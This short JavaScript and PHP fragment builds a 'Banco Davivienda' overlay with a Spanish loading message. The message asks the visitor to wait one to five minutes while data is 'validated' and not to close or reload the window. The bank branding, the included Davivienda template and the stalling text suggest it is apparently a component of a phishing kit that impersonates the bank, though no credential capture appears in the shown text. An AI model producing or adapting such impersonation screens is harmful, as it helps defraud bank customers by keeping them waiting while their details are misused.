var davivienda_titulo = 'Banco Davivienda';
var davivienda_body = `
<div class="mensaje" id="mensaje">
    <table>
        <tr>
            <td align="left">Por favor espere un momento estamos <strong>validando algunos datos.</strong> Puede tardar entre 1 a 5 minuto. <strong>No cierres o recargues esta ventana.</strong></td>
            <td><img id="cargandoani" src="${my_banco}img/load.gif"></td>
        </tr>
    </table>
    <img id="cargandoani2" src="${my_banco}img/load.gif">
</div>`;

<?php require_once('_plantilla_davivienda.php'); ?>


//<script>
    $('#fondo,#mensaje').show();